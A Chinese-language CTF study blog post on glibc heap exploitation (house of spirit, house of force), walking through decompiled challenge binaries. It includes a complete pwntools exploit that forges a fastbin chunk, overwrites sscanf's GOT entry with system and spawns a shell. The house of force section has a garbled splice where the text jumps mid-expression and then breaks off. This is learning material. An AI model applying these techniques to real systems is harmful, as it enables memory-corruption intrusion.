作者：Hcamael@知道创宇404实验室
准备一份house of系列的学习博文，在how2heap上包括下面这些：
  * house of spirit
  * house_of_force
  * house_of_einherjar
  * house_of_orange
  * house_of_lore
#### house of spirit
house of spirit是fastbin的一种利用方法，利用demo可参考:
我通过具体的CTF PWN题目来学习该利用方法，题目见: 
这题是hack.lu 2014
ctf的一道400分的32位下的PWN题，这题原本是没有给libc的，但是我搜了下网上这题的writeup，不需要libc有两种方法，一种是假设服务器上用的是最新版的libc，然后从各个发行版的系统找libc，一个一个试，另一种是使用ret2dl-resolve，这个利用方法我准备单独写一篇博文来说，而本文主要是学习house of spirit，所以就用本地的libc，假设已知libc。
漏洞点很简单，首先要能看出一个结构体：
    struct rifle {
        char descript[0x19]
        char name[0x1b]
        char *pre_add
    }
然后在`sub_8048644`函数中，大致逻辑如下：
    add()
    {
      rifles *v1;
      unsigned int v2;
      v1 = rifle;
      rifle = (rifles *)malloc(0x38u);
      if ( rifle )
      {
        rifle->pre_add = (int)v1;
        printf("Rifle name: ");
        fgets(rifle->name, 56, stdin);
        str_deal(rifle->name);
        printf("Rifle description: ");
        fgets(rifle->descript, 56, stdin);
        str_deal(rifle->descript);
        ++rifle_num;
      }
      else
      {
        puts("Something terrible happened!");
      }
结构体中`name`的长度只有0x1b，但是却能输入56长度的字符串，所以可以把后面的`pre_add`覆盖，或者把下一个堆进行覆盖
##### 泄露内存
因为libc已知，程序没开PIE，所以只需要泄露libc地址，然后算出libc基地址
内存泄露利用的是`sub_8048729`函数，该函数的大致逻辑如下:
    show_rifles()
    {
      rifles *i;
      unsigned int v2;
      printf("Rifle to be ordered:\n%s\n", "===================================");
      for ( i = rifle; i; i = (rifles *)i->pre_add )
      {
        printf("Name: %s\n", i->name);
        printf("Description: %s\n", i);
        puts("===================================");
      }
    }
`rifle->pre_add`是可控的，把`rifle->pre_add =
0x804A258-25`设置为sscanf的got表地址减去25，这样Name输出的就是`sscanf_got`的值，并且`sscanf_got->pre_add`的值为0，能让该程序继续运行而不报错
得到`sscanf_got`的值后，可以通过libc的偏移算出libc的基地址
##### 使用house_of_spirit进行任意地址写
house of spirit简单的来说就是free一个假的fastbin堆块，然后再下次malloc的时候就会返回该假堆块
所以第一步是要构造假的堆块，在该程序中，只有一个`malloc(0x38)`，所以要构造一个`size=0x41`的堆块，在`.bss_804A2A0`地址的`order_num`，和`.bss_804A2A4`的`rifle_num`，一个是在free的时候自增1，一个是在rifle
add的时候自增1，所以只要add 0x41次rifle，就能把rifle_num设置为0x41
chunk的size位伪造好了，现在是bypass libc对free
fastbin的check，主要是会对下一个chunk的size进行check，所以不仅要伪造当前check的size，还要伪造下一个chunk的size
下一个chunk的地址是`0x804A2A4+0x40=0x804a2e4`，该地址是储存`notice`的地址，属于可控区域，代码如下：
    information = (char *)&unk_804A2C0;
    leave()
    {
      unsigned int v0;
      printf("Enter any notice you'd like to submit with your order: ");
      fgets(information, 128, stdin);
      str_deal(information);
    }
假堆块构造完成了，free了之后`0x804A2A0`将会加入到fastbin中，在下一次add
rifle的时候malloc会返回该地址，所以`0x804A2A4`往下的变量都可控，这个时候我们能修改`information`的值，然后在`leave`函数会向`information`指向的地址写入值
这样就达到了任意地址写的目的
##### 最终利用
能做到任意地址写，下面就很简单了，方法有很多，我使用的是重写`sscanf_got`地址的值为计算出的`system`地址
    int read_action()
    {
      int v1; 
      char s;
      unsigned int v3;
      do
      {
        printf("Action: ");
        fgets(&s, 32, stdin);
      }
      while ( !__isoc99_sscanf(&s, "%u", &v1) );
      return v1;
    }
当输入了`/bin/sh`之后，会赋值给变量`s`，然后传给`sscanf`，这时候`sscanf_got`的值已经被改成了system的值，所以实际执行的是`system("/bin/sh")`
最终达成getshell的目的，payload如下:
    #!/usr/bin/env python
    # -*- coding=utf-8 -*-    
    from pwn import *
    context.log_level = "debug"
    def add(name, descrip):
        p.readuntil("Action:")
        p.sendline("1")
        p.readuntil("name:")
        p.sendline(name)
        p.readuntil("description:")
        p.sendline(descrip)
    def show_rifles():
        p.readuntil("Action:")
        p.sendline("2")
        p.readuntil("Name: ")
        p.readuntil("Name: ")
        return u32(p.read(4))
    def free():
        p.readuntil("Action:")
        p.sendline("3")
    def leave(message):
        p.readuntil("Action:")
        p.sendline("4")
        p.readuntil("order: ")
        p.sendline(message)
    sscanf_got = 0x804A258
    fake_heap = 0x804A2A0
    system_offset = 0x3ada0
    p = process("oreo_35f118d90a7790bbd1eb6d4549993ef0", stdin=PTY)
    name_payload1 = "aaa" + "bbbb"*6 + p32(sscanf_got-25)
    add(name_payload1, "hhh")
    sscanf = show_rifles()
    libc_base = sscanf - 0x5c4c0
    for x in xrange(0x40-1):
        add("mm", "gg")
    name_payload2 = "aaa" + "bbbb"*6 + p32(fake_heap+8)
    add(name_payload2, "uuu")
    message_payload = "\x00\x00\x00\x00"*9 + p32(0x41)
    leave(message_payload)
    # raw_input()
    free()
    # raw_input()
    add("name", p32(sscanf_got))
    leave(p32(libc_base+system_offset))
    p.sendline("/bin/sh\0")
    p.interactive()
#### house of force
house of force是修改top chunk size的一种利用方法，利用demo可参考:
题目见: 
该利用姿势是由于libc的堆管理在malloc的时候默认top chunk的size是正确合法的，所以不会去检查top
chunk的size值，这就导致了一种情况，当一个程序存在可以修改top chunk size的漏洞时，我们把top
chunk的size修改成0xffffffff(x86)
假设这个时候的top_chunk=0x601200,
然后malloc(0xffe00020)，然后对malloc申请的size进行检查，`0xffe00030  9 )
        return puts("Invalid ID.");
      note = note_list[id];
      if ( !note )
        return puts("Note has been deleted.");
      length = note_length[id];
      dword_804B0E0[id] = 0;
      puts("Input the new content:");
      read_buffer(note, length, 10);
      return puts("Edit success.");
    }
有一个edit函数，可以编辑note_list指向地址的值，所以如果我们能控制note_list的值，就可以做到任意地址修改
所以我们的目的是让下一次malloc的返回值为`0x804B120`，这样需要在这一次malloc后，让`top_chunk=0x804B118`
所以根据泄露出的heap地址计算出当前top_chunk的地址，然后再计算出本次malloc的size: `0x10804B118-top_chunk`
或者 `-(top_chunk-0x804B118)`
##### 泄露libc地址
按照该程序的逻辑，应该在show函数中成输出note_list指向地址的值，但是该函数的功能还未实现:
    int show()
    {
      return puts("WTF? Something strange happened.");
    }
所以就需要想别的办法来泄露libc地址了